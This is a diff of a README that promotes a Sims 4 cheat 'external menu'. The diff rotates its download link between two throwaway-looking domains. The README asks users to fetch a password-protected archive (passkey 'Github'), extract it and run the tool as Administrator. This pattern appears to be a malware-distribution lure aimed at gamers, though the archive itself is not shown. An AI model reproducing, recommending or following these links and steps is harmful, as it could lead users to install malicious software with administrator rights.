@@ -6,7 +6,7 @@ The Sims 4 external menu with money cheats, needs manipulation, skill unlocker, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -78,7 +78,7 @@ Based on popular mods like **MC Command Center**, **UI Cheats Extension**, and *
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch The Sims 4.
 4. Run the hack **as Administrator**.
